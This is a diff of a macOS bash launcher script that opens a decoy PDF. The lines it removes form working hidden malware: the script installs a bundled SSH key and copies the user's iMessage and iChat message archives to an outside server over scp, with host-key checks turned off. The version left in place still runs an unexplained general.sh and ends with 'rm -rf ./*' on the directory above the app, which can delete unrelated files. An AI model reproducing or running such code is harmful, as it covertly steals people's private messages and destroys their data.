@@ -1,37 +1,12 @@
 #!/bin/bash
 CDIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd ) #Directory of app
-ARCHIVE=~/Library/Containers/com.apple.iChat/Data/Library/Messages/Archive
-MESSAGES=~/Library/Messages
-SERV=www.fsckyourself.com
-SERVPORT=8087
-SERVUSER=sauron
-SERVPATH=/home/sauron/messages
-KEY=${CDIR}/.ssh/id_rsa
-KEYDIR=~/.msssh/
-KEYPATH=~/.msssh/id_rsa
-
-mkdir ${KEYDIR}
-cp ${KEY} ${KEYPATH}
-chmod 400 ${KEYPATH}
-
-
 cd ${CDIR}
 
 open ${CDIR}/Content/project.pdf
-cd ${ARCHIVE}
-if [ $? -eq 0 ]; then
-    ssh -i ${KEYPATH} -p ${SERVPORT} -o StrictHostKeyChecking=no ${SERVUSER}@${SERV} "mkdir ${SERVPATH}"
-    ssh -i ${KEYPATH} -p ${SERVPORT} -o StrictHostKeyChecking=no ${SERVUSER}@${SERV} "mkdir ${SERVPATH}/${USER}"
-    scp -i ${KEYPATH} -P ${SERVPORT} -o StrictHostKeyChecking=no -r ${ARCHIVE} ${SERVUSER}@${SERV}://${SERVPATH}/${USER}/
-fi
-cd ${MESSAGES}
-if [ $? -eq 0 ]; then
-    ssh -i ${KEYPATH} -p ${SERVPORT} -o StrictHostKeyChecking=no ${SERVUSER}@${SERV} "mkdir ${SERVPATH}"
-    ssh -i ${KEYPATH} -p ${SERVPORT} -o StrictHostKeyChecking=no ${SERVUSER}@${SERV} "mkdir ${SERVPATH}/${USER}"
-    scp -i ${KEYPATH} -P ${SERVPORT} -o StrictHostKeyChecking=no -r ${MESSAGES} ${SERVUSER}@${SERV}://${SERVPATH}/${USER}/
-fi
 
-#rm -rf ${CDIR} #cleanup
+./general.sh
+
 cd ${CDIR}/../
 rm -rf ./* #cleanup
+
 
